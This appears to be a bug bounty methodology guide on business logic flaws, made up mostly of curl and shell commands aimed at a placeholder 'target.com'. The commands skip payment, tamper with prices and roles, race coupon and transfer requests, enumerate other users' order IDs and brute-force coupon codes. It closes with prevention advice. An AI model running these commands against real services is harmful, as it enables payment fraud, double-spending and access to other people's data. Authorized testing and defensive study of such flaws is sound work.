# Business Logic Vulnerabilities

> Comprehensive business logic vulnerability testing methodology for bug bounty hunters & penetration testers (2025–2026)

## Overview

Business logic vulnerabilities (logic flaws, business logic errors) occur when an application's legitimate functionality can be misused in unintended ways, violating implicit business rules. These flaws are hard to detect automatically and require understanding the application's intended flow and testing assumptions. Based on OWASP WSTG Business Logic Testing, PortSwigger Logic Flaws labs, and 2025–2026 bug bounty trends (e‑commerce abuse, ATO via logic, race conditions, API logic bypasses).

## Core Mindset & Approach

- **Map full user journeys / multi‑step workflows** – understand intended flows
- **Identify implicit business rules** (e.g., "can't buy for free", "one coupon per account")
- **Assume nothing** – test what happens if you violate order, repeat steps, tamper values, or act out‑of‑sequence
- **Use proxy (Burp)** to observe/modify every request/response
- **Think like an abuser of incentives** (discounts, transfers, bookings, votes)

## Tool Installation

```bash
# Core reconnaissance & fuzzing tools
go install github.com/ffuf/ffuf@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# Parameter discovery
pip install arjun
go install github.com/hahwul/dalfox/v2@latest

# Race condition testing tools
pip install turbo-intruder-race  # Or use Burp Turbo Intruder
go install github.com/tsenkent/racepwn@latest

# Business logic specific
git clone https://github.com/PortSwigger/business-logic-vulnerabilities-lab-scripts.git
```

## Methodology

### 1. Multi‑Step Flows & Process Abuse

#### 1.1 Step Skipping / Reordering / Repeating

```bash
# Test checkout flow skipping payment step
curl -X POST "https://target.com/checkout/confirm" -H "Referer: https://target.com/cart" --data "items=1&total=100&skip_payment=true"

# Test signup skipping email verification
curl -X POST "https://target.com/signup/complete" -H "Referer: https://target.com/signup" --data "email=test@example.com&verified=true"

# Test booking reservation → cancel → reuse slot
curl -X POST "https://target.com/bookings/cancel/123" && curl -X POST "https://target.com/bookings/create" --data "slot_id=123"
```

#### 1.2 Infinite Loops / Reusable Actions

```bash
# Redeem referral code multiple times
for i in {1..20}; do
  curl -X POST "https://target.com/api/redeem" -H "Authorization: Bearer $token" --data "code=REFERRAL2025" &
done
wait

# Apply same discount repeatedly
seq 10 | xargs -I@ -P5 curl -X POST "https://target.com/cart/apply-discount" --data "code=SUMMER50"
```

#### 1.3 Negative / Zero / Extreme Values

```bash
# Quantity manipulation
curl -X POST "https://target.com/cart" --data "product_id=1&quantity=-1"
curl -X POST "https://target.com/cart" --data "product_id=1&quantity=0"
curl -X POST "https://target.com/cart" --data "product_id=1&quantity=999999"

# Price/discount manipulation
curl -X POST "https://target.com/checkout" --data "total=-100"
curl -X POST "https://target.com/checkout" --data "discount=150"  # >100% discount

# Balance/credit negative top-up
curl -X POST "https://target.com/wallet/topup" --data "amount=-50"
```

### 2. Parameter & Hidden Field Manipulation

#### 2.1 Visible/Hidden Field Tampering

```bash
# Price manipulation in cart/checkout
curl -X POST "https://target.com/cart/update" --data "price=50"  # Original: 100

# Quantity/discount manipulation
curl -X POST "https://target.com/cart" --data "qty=1000"  # Original: 1

# User ID / resource ID tampering
curl -X GET "https://target.com/api/user/456" -H "Authorization: Bearer $token"  # Your ID: 123

# Role/privilege escalation
curl -X POST "https://target.com/profile/update" --data "is_admin=true&role=admin"
```

#### 2.2 Mass Assignment / Extra Parameters

```bash
# Add unexpected fields in POST/JSON
curl -X POST "https://target.com/api/user/create" -H "Content-Type: application/json" --data '{"username":"test","email":"test@example.com","is_premium":true,"balance":999999}'

# Test for over-posting vulnerabilities
curl -X PUT "https://target.com/api/products/1" -H "Content-Type: application/json" --data '{"name":"Product","price":100,"owner_id":2}'
```

#### 2.3 IDOR-like Logic Flaws

```bash
# Extract ID patterns from crawled URLs
cat crawledurls.txt | grep -oE "(id|user_id|account_id|uid|order_id|pid)=[0-9]+" | sed 's/=[0-9]*/=FUZZ/' | sort -u | anew idor-candidates.txt

# Automated IDOR testing with ffuf
ffuf -u https://target.com/api/order/FUZZ -w /home/pwn/wordlists/ids.txt -H "Authorization: Bearer $token" -mc 200 -t 20

# Manual testing sequence
for id in {1000..1100}; do
  curl -s "https://target.com/api/order/$id" -H "Authorization: Bearer $token" | grep -q "total" && echo "Order $id accessible"
done
```

### 3. Race Conditions & Timing Issues

#### 3.1 Parallel / Concurrent Requests

```bash
# Coupon redemption race condition
seq 20 | xargs -I@ -P10 curl -X POST "https://target.com/api/redeem" --data "code=UNIQUE2025"

# Limited stock race condition
seq 5 | xargs -I@ -P5 curl -X POST "https://target.com/checkout" --data "product_id=1&qty=1"

# Voting/likes race condition
seq 50 | xargs -I@ -P20 curl -X POST "https://target.com/poll/1/vote" --data "choice=A"

# Transfer double-spend race
seq 2 | xargs -I@ -P2 curl -X POST "https://target.com/transfer" --data "amount=100&to=attacker"
```

#### 3.2 Tools for Racing

```bash
# Using turbo-intruder-race (Python)
python3 race_condition.py --url https://target.com/api/redeem --data 'code=TEST2025' --threads 10 --requests 20

# Custom race testing script
for i in {1..10}; do
  curl -X POST "https://target.com/limited-offer" --data "claim=true" &
done
wait
```

### 4. Privilege Escalation & Access Control Logic Flaws

#### 4.1 Lower-priv User Accesses High-priv Functions

```bash
# Regular user changes admin settings via ID swap
curl -X POST "https://target.com/admin/settings" -H "Authorization: Bearer $user_token" --data "setting=value"

# View/edit other users' data by tampering IDs
curl -X GET "https://target.com/api/user/456/profile" -H "Authorization: Bearer $token"

# Force browsing / direct object reference bypass
curl -X GET "https://target.com/admin" -H "Authorization: Bearer $user_token"
```

#### 4.2 Inconsistent Enforcement

```bash
# API allows action but UI blocks it → bypass UI
curl -X POST "https://target.com/api/admin/action" -H "Authorization: Bearer $user_token" --data "action=delete_user&id=123"

# Check for different validation between client and server
curl -X POST "https://target.com/api/transfer" -H "Content-Type: application/json" --data '{"amount":10000,"to":"attacker"}'  # UI limit: 1000
```

### 5. Other Common 2025–2026 Patterns

#### 5.1 Coupon / Promo Abuse

```bash
# Unlimited use testing
for i in {1..100}; do curl -X POST "https://target.com/apply-coupon" --data "code=FREE100"; done

# Stacking discounts (should be prevented)
curl -X POST "https://target.com/checkout" --data "coupon1=SAVE50&coupon2=FREE20&coupon3=WELCOME10"

# Negative discounts
curl -X POST "https://target.com/checkout" --data "coupon=-50"

# Code generation prediction
for code in {0000..9999}; do curl -s "https://target.com/check-coupon?code=$code" | grep -q "valid" && echo "Valid: $code"; done
```

#### 5.2 Refund / Return Logic

```bash
# Refund more than paid
curl -X POST "https://target.com/refund" --data "order_id=123&amount=200"  # Original: 100

# Return used items infinitely
curl -X POST "https://target.com/return" --data "item_id=456&reason=defective"
curl -X POST "https://target.com/return" --data "item_id=456&reason=defective"  # Second time

# Currency arbitrage
curl -X POST "https://target.com/purchase" --data "currency=USD&amount=100"
curl -X POST "https://target.com/refund" --data "currency=EUR&amount=100"
```

#### 5.3 Subscription / Trial Abuse

```bash
# Extend trial repeatedly
curl -X POST "https://target.com/trial/extend" --data "user_id=123"

# Downgrade to free after premium features used
curl -X POST "https://target.com/subscription/cancel" --data "immediate=false"
# Continue using premium features

# Bypass payment for subscription
curl -X POST "https://target.com/subscription/upgrade" --data "plan=premium&payment_status=success"
```

#### 5.4 Referral / Invite Loops

```bash
# Self-referral for infinite credits
curl -X POST "https://target.com/referral/create" --data "code=SELFREF"
curl -X POST "https://target.com/referral/use" --data "code=SELFREF"

# Invite loops with multiple accounts
for i in {1..10}; do
  curl -X POST "https://target.com/signup" --data "email=user$i@example.com&referral=MAIN_ACCOUNT"
done
```

### 6. API-specific Logic Flaws

#### 6.1 GraphQL Logic Bypasses

```bash
# GraphQL introspection + mutation abuse
curl -X POST "https://target.com/graphql" -H "Content-Type: application/json" --data '{"query":"mutation { updateOrder(id: 123, price: 0) { id } }"}'

# Batching mutations to bypass limits
curl -X POST "https://target.com/graphql" -H "Content-Type: application/json" --data '{"query":"mutation { redeem1: redeemCoupon(code: \"TEST1\") { success } redeem2: redeemCoupon(code: \"TEST1\") { success } }"}'
```

#### 6.2 Rate-limit Bypass via Param Tampering

```bash
# Change parameter names to bypass rate limits
curl -X POST "https://target.com/api/vote" --data "poll_id=1&choice=A"
curl -X POST "https://target.com/api/vote" --data "poll_id=1&selection=A"  # Different param

# Use different HTTP methods
curl -X GET "https://target.com/api/vote?poll_id=1&choice=A"
curl -X POST "https://target.com/api/vote" --data "poll_id=1&choice=A"
```

## Advanced Techniques & Automation

### 7.1 Automated Business Logic Scanning

```bash
# Use nuclei templates for business logic
nuclei -u https://target.com -t ~/nuclei-templates/business-logic/ -o nuclei-business-logic.txt

# Custom fuzzing with ffuf for logic flaws
ffuf -u https://target.com/checkout/FUZZ -w /home/pwn/wordlists/business-logic-paths.txt -X POST -d "amount=100" -mc 200 -t 50
```

### 7.2 Burp Suite Extensions for Business Logic

- **Param Miner** – Discover hidden parameters
- **Turbo Intruder** – Race condition testing
- **Autorize** – Authorization testing
- **Bypass WAF** – WAF evasion for logic testing

### 7.3 Custom Scripts for Complex Logic Testing

```bash
#!/bin/bash
# Multi-step workflow testing
# 1. Add to cart
# 2. Skip payment
# 3. Confirm order

TOKEN="Bearer eyJ0..."
CART=$(curl -s -X POST "https://target.com/cart/add" -H "Authorization: $TOKEN" --data "product_id=1")
ORDER=$(curl -s -X POST "https://target.com/checkout" -H "Authorization: $TOKEN" --data "skip_payment=true")
CONFIRM=$(curl -s -X POST "https://target.com/order/confirm/$ORDER" -H "Authorization: $TOKEN")
echo "Order confirmed without payment: $CONFIRM"
```

## Detection & Verification

- **Unexpected behavior** – free items, negative balance, other user data
- **Financial impact simulation** – $0 checkout success
- **Compare intended flow vs abused flow**
- **Check server-side logs** if accessible (errors on invalid states)
- **PoC**: Video/screenshots of abuse + business impact (e.g., "attacker gains $X free credit")

## Prevention (Developer View – OWASP WSTG & 2025+)

- **Enforce server-side business rules** (never trust client input)
- **Validate state / sequence** in multi-step flows
- **Use transaction locks** for race-prone actions (e.g., coupon redemption)
- **Least-privilege & strict access control** checks per action
- **Immutable IDs + ownership validation**
- **Rate limiting + uniqueness constraints** (one use per user)
- **Threat modeling** for critical flows (checkout, transfers)
- **Avoid hidden fields** for security-sensitive data

## References

- **Checklist**: [Web-Vulnerability-Testing-Checklist/Business-Logic.md](../Web-Vulnerability-Testing-Checklist/Business-Logic.md)
- **PortSwigger Web Security Academy - Business Logic Vulnerabilities**: https://portswigger.net/web-security/logic-flaws
- **OWASP WSTG - Business Logic Testing (Latest)**: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/README
- **PayloadsAllTheThings - Business Logic Errors**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Business%20Logic%20Errors
- **Recent 2025–2026 write-ups**: Intigriti exploiting logic flaws, Medium/Infosec bug bounty examples (races, e-commerce abuse)

> **Happy (ethical) hunting** — business logic flaws remain high‑impact in 2026 bug bounties (e.g., unlimited credits, ATO chains, financial abuse)!
